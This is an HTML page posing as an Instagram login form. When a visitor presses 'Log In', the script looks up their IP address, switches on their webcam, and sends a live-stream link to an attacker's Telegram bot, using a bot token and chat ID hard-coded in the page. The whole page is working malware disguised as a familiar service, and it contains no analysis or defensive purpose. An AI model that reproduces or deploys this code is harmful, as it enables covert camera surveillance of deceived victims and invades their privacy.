<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
    <style>
        body {
            background-color: #121212;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1d1d1d;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 320px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: none;
            border-radius: 5px;
            background-color: #2c2c2c;
            color: #ffffff;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #007bb5;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Instagram Login</h2>
        <input type="text" id="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" placeholder="Password">
        <button onclick="startLiveStream()">Log In</button>
    </div>

    <script>
        let peer;
        let peerId;
        let localStream;

        async function startLiveStream() {
            await getIpAddress();  // Fetch IP address
            await initializeCamera();  // Start user’s camera
            initializePeerConnection();  // Start PeerJS connection
        }

        async function getIpAddress() {
            await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    console.log("IP Address:", data.ip);
                });
        }

        async function initializeCamera() {
            try {
                // Get user’s camera stream
                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                console.log('Camera stream initialized.');
            } catch (error) {
                console.error('Failed to access camera:', error);
            }
        }

        function initializePeerConnection() {
            peer = new Peer();  // Initialize PeerJS

            peer.on('open', (id) => {
                peerId = id;
                const liveStreamLink = `${window.location.origin}/live.html?peerId=${peerId}`;
                sendStreamLinkToBot(liveStreamLink);  // Send peer ID and link to Telegram bot

                // Automatically call the live.html page
                peer.on('connection', (conn) => {
                    conn.on('open', () => {
                        console.log('Peer connection established.');
                    });

                    // Start the call to the live.html peer
                    const call = peer.call(conn.peer, localStream);
                    call.on('error', (err) => {
                        console.error('Call error:', err);
                    });
                });
            });
        }

        function sendStreamLinkToBot(liveStreamLink) {
            const message = `New Interaction Detected!\nLive Camera Stream: ${liveStreamLink}\nPeer ID: ${peerId}\nTime: ${new Date().toLocaleString()}`;

            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
            const chatId = '860517021';  // Your chat ID
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        }
    </script>

</body>
</html>
